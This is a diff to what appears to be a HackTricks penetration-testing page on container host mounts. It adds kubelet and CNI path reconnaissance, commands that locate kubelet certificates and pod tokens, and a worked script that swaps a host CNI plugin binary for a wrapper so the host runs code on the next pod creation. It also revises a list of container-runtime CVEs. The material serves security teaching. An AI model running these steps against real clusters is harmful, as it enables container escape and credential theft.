@@ -227,6 +227,60 @@ find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/
 
 These commands are useful because they show the three main impact families of mounted `/var`: application tampering, secret recovery, and lateral movement into neighboring workloads.
 
+## Kubelet State, Plugins, And CNI Paths
+
+A mount of `/var/lib/kubelet`, `/opt/cni/bin`, or `/etc/cni/net.d` is often exposed through privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, and storage helpers. These mounts are easy to dismiss as "node plumbing", but they sit directly in the execution path for new pods and often contain kubelet credentials, projected secrets, registration sockets, and executable host-side plugin binaries.
+
+High-value targets include:
+
+- `/var/lib/kubelet/pki`
+- `/var/lib/kubelet/pods`
+- `/var/lib/kubelet/device-plugins/kubelet.sock`
+- `/var/lib/kubelet/pod-resources/kubelet.sock`
+- `/var/lib/kubelet/plugins`
+- `/var/lib/kubelet/plugins_registry`
+- `/opt/cni/bin`
+- `/etc/cni/net.d`
+
+Useful review commands are:
+
+```bash
+find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
+  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
+ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
+find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
+grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
+```
+
+Why these paths matter:
+
+- `/var/lib/kubelet/pki` may expose kubelet client certificates and other node-local credentials that can sometimes be reused against the API server or kubelet-facing TLS endpoints, depending on cluster design.
+- `/var/lib/kubelet/pods` often contains projected service-account tokens and mounted Secrets for neighboring pods on the same node.
+- `/var/lib/kubelet/pod-resources/kubelet.sock` is mainly a reconnaissance surface, but a very useful one: it reveals which pods and containers currently own GPUs, hugepages, SR-IOV devices, and other scarce node-local resources.
+- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, and `/var/lib/kubelet/plugins_registry` reveal which CSI, DRA, and device plugins are installed and which sockets the kubelet is expected to talk to. If those directories are writable rather than merely readable, the finding becomes much more serious.
+- `/opt/cni/bin` and `/etc/cni/net.d` sit directly on the pod-network setup path. Writable access there is often a delayed host-execution primitive rather than just configuration exposure.
+
+### Full Example: Writable `/opt/cni/bin`
+
+If a host CNI binary directory is mounted read-write, replacing a plugin can be enough to obtain host execution the next time the kubelet creates a pod sandbox on that node:
+
+```bash
+plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
+  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
+[ -n "$plugin" ] || exit 1
+mv "$plugin" "${plugin}.orig"
+cat <<'EOF' > "$plugin"
+#!/bin/sh
+id > /tmp/cni-triggered
+exec "$(dirname "$0")/$(basename "$0").orig" "$@"
+EOF
+chmod +x "$plugin"
+echo "wait for the next pod scheduled on this node"
+```
+
+This is not as immediate as a mounted `docker.sock`, but it is often more realistic in compromised Kubernetes infrastructure pods. The important point is that the modified binary is later executed by the host network setup flow, not by the current container.
+
+
 ## Runtime Sockets
 
 Sensitive host mounts often include runtime sockets rather than full directories. These are so important that they deserve explicit repetition here:
@@ -257,9 +311,9 @@ If one of these succeeds, the path from "mounted socket" to "start a more privil
 Host mounts also intersect with runtime vulnerabilities. Important recent examples include:
 
 - `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
-- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, where OverlayFS copy-up races could produce host-path writes during builds.
+- `CVE-2024-23651`, `CVE-2024-23652`, and `CVE-2024-23653` in BuildKit, where malicious Dockerfiles, frontends, and `RUN --mount` flows could reintroduce host file access, deletion, or elevated privileges during builds.
 - `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
-- `CVE-2024-40635` in containerd, where a large `User` value could overflow into UID 0 behavior.
+- `CVE-2025-47290` in `containerd` 2.1.0, where a TOCTOU during image unpack could let a specially crafted image modify the host filesystem during pull.
 
 These CVEs matter here because they show that mount handling is not only about operator configuration. The runtime itself may also introduce mount-driven escape conditions.
 
@@ -271,6 +325,8 @@ Use these commands to locate the highest-value mount exposures quickly:
 mount
 find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
 find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
+find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
+ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
@@ -280,4 +336,10 @@ What is interesting here:
 - Host root, `/proc`, `/sys`, `/var`, and runtime sockets are all high-priority findings.
 - Writable proc/sys entries often mean the mount is exposing host-global kernel controls rather than a safe container view.
 - Mounted `/var` paths deserve credential and neighboring-workload review, not just filesystem review.
+- Kubelet state directories and CNI/plugin paths deserve the same priority as runtime sockets because they often sit directly on the node's pod-creation and credential-distribution path.
+
+## References
+
+- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
+- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
 {{#include ../../../banners/hacktricks-training.md}}
